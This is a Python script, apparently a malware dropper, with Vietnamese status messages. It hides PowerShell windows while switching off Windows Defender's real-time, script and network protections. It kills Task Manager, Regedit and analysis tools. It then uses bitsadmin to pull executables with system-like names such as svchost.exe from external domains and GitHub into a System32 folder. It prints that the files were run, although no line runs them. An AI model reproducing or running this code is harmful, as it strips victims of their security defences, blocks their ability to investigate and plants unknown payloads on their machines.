import subprocess
import time

def disable_windows_defender():
    disable_cmd = 'powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell -WindowStyle Hidden Set-MpPreference -SubmitSamplesConsent 2'
    subprocess.run(disable_cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    print("Windows Defender đã bị tắt.")

def block_processes():
    processes_to_block = ["Taskmgr.exe", "MegaDumper.exe", "ProcessHacker.exe", "procexp.exe", "Regedit.exe", "de4dot.exe", "die.exe", "MpCmdRun.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerUI.exe"]
    for process_name in processes_to_block:
        subprocess.run(["taskkill", "/F", "/IM", process_name], creationflags=subprocess.CREATE_NO_WINDOW)

def download_and_execute(url):
    download_folder = "C:\Windows\System32\WindowsPowerShell"
    subprocess.run(["bitsadmin", "/transfer", "mydownloadjob", "/download", "/priority", "normal", url, f"{download_folder}\\{url.split('/')[-1]}"], creationflags=subprocess.CREATE_NO_WINDOW)
    print(f"Tệp {url.split('/')[-1]} đã được tải xuống và chạy thành công.")

def run_tasks():
    disable_windows_defender()
    block_processes()
    
    # Download and execute each file
    urls_to_download = [
        "https://fvia.id.vn/defender.exe",
        "https://fvia.id.vn/svchost.exe",
        "https://fvia.id.vn/update.exe",
        "https://github.com/fviatool/fvia/raw/main/update.exe",
        "https://github.com/fviatool/fvia/raw/main/fvia.exe",
        "https://github.com/fviatool/fvia/raw/main/Runtime.exe",
        "https://fviatool.com/update.exe"
    ]

    for url in urls_to_download:
        download_and_execute(url)
        time.sleep(5)  # Wait for 5 seconds before the next task

if __name__ == "__main__":
    run_tasks()
